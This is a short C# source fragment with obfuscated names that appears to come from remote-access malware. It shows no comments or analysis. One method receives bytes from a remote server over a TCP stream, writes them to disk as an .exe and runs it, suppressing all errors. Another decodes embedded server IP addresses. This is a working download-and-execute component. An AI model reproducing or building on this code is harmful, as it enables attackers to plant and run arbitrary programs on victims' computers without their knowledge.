using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace thnaviwa;

internal class OCRMD
{
	public MACDM server;

	public OCRMD(MACDM lID)
	{
		server = lID;
	}

	public NetworkStream thnaviwaNS(TcpClient thnaviwatcpsck)
	{
		return thnaviwatcpsck.GetStream();
	}

	public void thnaviwado_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void thnaviwaremove_user()
	{
		try
		{
			byte[] array = server.thnaviwapull_data();
			if (array != null && !File.Exists(CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwaremvUser + ".exe"))
			{
				File.WriteAllBytes(CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwaremvUser + ".exe", array);
				thnaviwado_process(CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwaremvUser + ".exe");
			}
		}
		catch
		{
		}
	}

	public string thnaviwaserverIPD()
	{
		return Encoding.UTF8.GetString(CONFIG.thnaviwavpsips, 0, CONFIG.thnaviwavpsips.Length);
	}
}
